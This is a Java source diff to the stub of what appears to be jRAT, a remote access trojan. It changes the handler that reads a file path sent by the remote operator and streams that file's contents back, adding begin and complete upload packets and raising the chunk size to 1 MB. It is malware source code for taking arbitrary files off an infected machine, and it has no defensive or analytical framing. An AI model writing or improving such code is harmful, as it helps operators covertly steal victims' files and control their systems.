@@ -3,10 +3,10 @@ package se.jrat.stub.packets.incoming;
 import java.io.File;
 import java.io.FileInputStream;
 
-import se.jrat.common.io.FileIO;
 import se.jrat.stub.Connection;
-import se.jrat.stub.Main;
 import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
+import se.jrat.stub.packets.outgoing.Packet30BeginClientUpload;
+import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;
 
 
 public class Packet21ClientUploadFile extends AbstractIncomingPacket {
@@ -16,15 +16,19 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 		File file = new File(Connection.readLine());
 
 		if (file.exists() && file.isFile()) {
-			FileInputStream fileInput = new FileInputStream(file);
-			byte[] chunk = new byte[1024];
+			Connection.addToSendQueue(new Packet30BeginClientUpload(file));
 
-			for (long pos = 0; pos < file.length(); pos += 1024) {
+			FileInputStream fileInput = new FileInputStream(file);
+			byte[] chunk = new byte[1024 * 1024];
+
+			for (long pos = 0; pos < file.length(); pos += 1024 * 1024) {
 				int read = fileInput.read(chunk);
 				
 				Connection.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
 			}
 			fileInput.close();
+			
+			Connection.addToSendQueue(new Packet31CompleteClientUpload(file));
 		}
 	}
 
